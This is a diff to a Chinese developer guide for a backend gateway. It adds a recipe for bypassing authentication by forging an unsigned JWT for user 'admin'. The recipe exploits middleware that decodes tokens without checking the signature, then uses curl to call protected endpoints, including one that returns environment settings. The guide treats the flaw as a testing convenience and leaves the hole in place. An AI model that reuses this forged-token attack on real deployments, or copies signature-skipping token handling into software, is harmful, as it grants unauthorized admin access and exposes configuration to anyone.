@@ -108,6 +108,31 @@ pnpm check   # Lint + 类型检查
 ### Docker
 详见 `@./docs/operations/OPERATIONS.md`。
 
+## 本地 API 测试（绕过认证）
+
+启动服务后（`bash scripts/start-deerflow.sh`），后端 Gateway (端口 8001) 的 `AuthMiddleware` 会拦截所有非公开路径返回 401。
+
+**绕过方式**：利用 `AuthMiddleware` 中 ADS JWT 解码逻辑**不验证签名**的特性（见 `backend/app/gateway/auth_middleware.py`），构造一个假 JWT 作为 `access_token` cookie：
+
+```bash
+# 生成假 JWT（1 小时有效期）
+JWT=$(python3 -c "
+import base64, json, time
+h = base64.urlsafe_b64encode(json.dumps({'alg':'HS256'}).encode()).rstrip(b'=').decode()
+p = base64.urlsafe_b64encode(json.dumps({
+    'username': 'admin',
+    'exp': int(time.time()) + 3600
+}).encode()).rstrip(b'=').decode()
+print(f'{h}.{p}.fakesig')
+")
+
+# 调用任意后端 API
+curl -s -b "access_token=$JWT" http://localhost:8001/api/models | python3 -m json.tool
+curl -s -b "access_token=$JWT" http://localhost:8001/api/env-settings | python3 -m json.tool
+```
+
+原理：`AuthMiddleware.dispatch()` 的 ADS 解码路径（行 80-110）在严格 JWT 验证**之前**执行，它只 base64 解码 payload，检查 `username` 和 `exp`，**不验证签名**。payload 合法即创建 User 放行。
+
 ## 开发准则
 
 ### 文档同步
